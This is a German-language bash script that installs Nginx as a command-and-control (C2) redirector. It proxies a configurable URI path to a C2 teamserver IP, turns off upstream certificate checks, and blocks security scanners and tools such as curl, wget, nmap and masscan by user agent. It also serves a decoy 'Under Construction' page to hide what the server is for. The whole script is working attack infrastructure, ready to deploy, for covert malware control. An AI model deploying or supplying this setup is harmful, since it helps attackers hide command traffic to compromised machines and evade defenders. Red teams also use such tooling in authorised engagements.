#!/bin/bash
#
# Nginx Redirector - Automatische Installation & Konfiguration
#
# Verwendung: sudo bash install_redirector_nginx.sh
#
# Beschreibung: Installiert Nginx als C2-Redirector
#

set -e

# Farben
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║         Nginx C2 Redirector - Automatische Installation      ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Root-Check
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}[!] Bitte als root ausführen (sudo)${NC}"
    exit 1
fi

echo -e "${GREEN}[+] System wird aktualisiert...${NC}"
apt update -qq
apt upgrade -y -qq

echo -e "${GREEN}[+] Installiere Nginx und Tools...${NC}"
apt install -y nginx certbot python3-certbot-nginx ufw net-tools

echo -e "${GREEN}[+] Sammle Konfigurationsinformationen...${NC}"

read -p "Ihre Domain (z.B. example.com): " DOMAIN
if [ -z "$DOMAIN" ]; then
    echo -e "${RED}[!] Domain ist erforderlich!${NC}"
    exit 1
fi

read -p "C2 Teamserver IP-Adresse: " C2_IP
if [ -z "$C2_IP" ]; then
    echo -e "${RED}[!] C2 IP ist erforderlich!${NC}"
    exit 1
fi

read -p "C2 Listener Port (Standard: 443): " C2_PORT
C2_PORT=${C2_PORT:-443}

read -p "C2 URI Pfad (z.B. /api, leer für /api): " C2_URI
C2_URI=${C2_URI:-/api}

read -p "Admin Email für SSL-Zertifikat: " ADMIN_EMAIL
ADMIN_EMAIL=${ADMIN_EMAIL:-admin@${DOMAIN}}

# Nginx-Konfiguration erstellen
echo -e "${GREEN}[+] Erstelle Nginx-Konfiguration...${NC}"

cat > /etc/nginx/sites-available/redirector << 'EOF'
upstream c2_backend {
    server C2_IP_PLACEHOLDER:C2_PORT_PLACEHOLDER;
}

# HTTP → HTTPS Redirect
server {
    listen 80;
    server_name DOMAIN_PLACEHOLDER;
    
    # Für Let's Encrypt Challenge
    location /.well-known/acme-challenge/ {
        root /var/www/html;
    }
    
    location / {
        return 301 https://$server_name$request_uri;
    }
}

# HTTPS Redirector (wird von certbot erweitert)
server {
    listen 443 ssl http2;
    server_name DOMAIN_PLACEHOLDER;

    # SSL-Konfiguration (wird von certbot hinzugefügt)
    # ssl_certificate und ssl_certificate_key werden von certbot gesetzt
    
    # Temporäre Self-Signed Certs (bis certbot läuft)
    ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
    ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
    
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;

    # Header-Manipulation
    add_header Server "nginx/1.18.0 (Ubuntu)" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    
    # Logging
    access_log /var/log/nginx/redirector_access.log;
    error_log /var/log/nginx/redirector_error.log;

    # === TRAFFIC FILTERING ===
    
    # Blockiere Scanner
    if ($http_user_agent ~* "(bot|spider|crawler|scanner|curl|wget|python|nmap|masscan)") {
        return 403;
    }

    # === C2 PROXY RULES ===
    
    location ~ ^C2_URI_PLACEHOLDER {
        proxy_pass https://c2_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_ssl_verify off;
        proxy_redirect off;
        proxy_buffering off;
        
        # WebSocket Support
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }

    # === FALLBACK: Normale Webseite ===
    
    location / {
        root /var/www/html;
        index index.html;
        try_files $uri $uri/ =404;
    }
}
EOF

# Platzhalter ersetzen
sed -i "s|DOMAIN_PLACEHOLDER|${DOMAIN}|g" /etc/nginx/sites-available/redirector
sed -i "s|C2_IP_PLACEHOLDER|${C2_IP}|g" /etc/nginx/sites-available/redirector
sed -i "s|C2_PORT_PLACEHOLDER|${C2_PORT}|g" /etc/nginx/sites-available/redirector
sed -i "s|C2_URI_PLACEHOLDER|${C2_URI}|g" /etc/nginx/sites-available/redirector

echo -e "${GREEN}[+] Erstelle Fallback-Webseite...${NC}"
mkdir -p /var/www/html
cat > /var/www/html/index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 500px;
            text-align: center;
        }
        h1 { 
            color: #333;
            margin-bottom: 20px;
        }
        p { 
            color: #666;
            line-height: 1.6;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚧 Under Construction</h1>
        <p>This website is currently being developed.</p>
        <p>Please check back soon for updates.</p>
    </div>
</body>
</html>
EOF

echo -e "${GREEN}[+] Aktiviere Redirector-Site...${NC}"
rm -f /etc/nginx/sites-enabled/default
ln -sf /etc/nginx/sites-available/redirector /etc/nginx/sites-enabled/

echo -e "${GREEN}[+] Teste Nginx-Konfiguration...${NC}"
nginx -t

echo -e "${GREEN}[+] Starte Nginx neu...${NC}"
systemctl restart nginx

echo -e "${GREEN}[+] Konfiguriere Firewall...${NC}"
ufw --force enable
ufw allow 80/tcp comment "HTTP"
ufw allow 443/tcp comment "HTTPS"
ufw allow 22/tcp comment "SSH"

echo -e "${GREEN}[+] Prüfe DNS-Record...${NC}"
CURRENT_IP=$(hostname -I | awk '{print $1}')
DOMAIN_IP=$(dig +short ${DOMAIN} | tail -n1)

if [ "$DOMAIN_IP" != "$CURRENT_IP" ]; then
    echo -e "${YELLOW}[!] Warnung: DNS-Record für ${DOMAIN} zeigt nicht auf diesen Server!${NC}"
    echo -e "${YELLOW}    Erwartet: ${CURRENT_IP}${NC}"
    echo -e "${YELLOW}    Aktuell:  ${DOMAIN_IP}${NC}"
    echo -e "${YELLOW}    Bitte DNS korrigieren vor SSL-Zertifikat.${NC}"
    SSL_SKIP=true
else
    echo -e "${GREEN}[✓] DNS-Record korrekt${NC}"
    SSL_SKIP=false
fi

# SSL-Zertifikat
if [ "$SSL_SKIP" = false ]; then
    echo -e "${GREEN}[+] Fordere Let's Encrypt SSL-Zertifikat an...${NC}"
    read -p "SSL-Zertifikat jetzt anfordern? (y/n) " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        certbot --nginx -d ${DOMAIN} --non-interactive --agree-tos -m ${ADMIN_EMAIL} --redirect
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✓] SSL-Zertifikat erfolgreich installiert!${NC}"
            systemctl reload nginx
        else
            echo -e "${YELLOW}[!] SSL-Zertifikat konnte nicht installiert werden.${NC}"
            echo -e "${YELLOW}    Manuell: certbot --nginx -d ${DOMAIN}${NC}"
        fi
    fi
fi

echo -e "${GREEN}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║                Installation abgeschlossen!                    ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo ""
echo -e "${GREEN}[✓] Nginx Redirector installiert und konfiguriert${NC}"
echo ""
echo -e "${YELLOW}Konfigurationsinformationen:${NC}"
echo "  Domain: ${DOMAIN}"
echo "  Server-IP: ${CURRENT_IP}"
echo "  C2-Server: ${C2_IP}:${C2_PORT}"
echo "  C2-URI: ${C2_URI}"
echo ""
echo -e "${YELLOW}Wichtige Dateien:${NC}"
echo "  Config: /etc/nginx/sites-available/redirector"
echo "  Logs:   /var/log/nginx/redirector_*.log"
echo "  Web:    /var/www/html/"
echo ""
echo -e "${YELLOW}Wichtige Kommandos:${NC}"
echo "  Status:       sudo systemctl status nginx"
echo "  Restart:      sudo systemctl restart nginx"
echo "  Reload:       sudo systemctl reload nginx"
echo "  Config-Test:  sudo nginx -t"
echo "  Logs:         sudo tail -f /var/log/nginx/redirector_access.log"
echo "  SSL erneuern: sudo certbot renew"
echo ""
echo -e "${YELLOW}Test:${NC}"
echo "  curl http://${DOMAIN}/"
if [ "$SSL_SKIP" = false ]; then
    echo "  curl https://${DOMAIN}/"
fi
echo ""
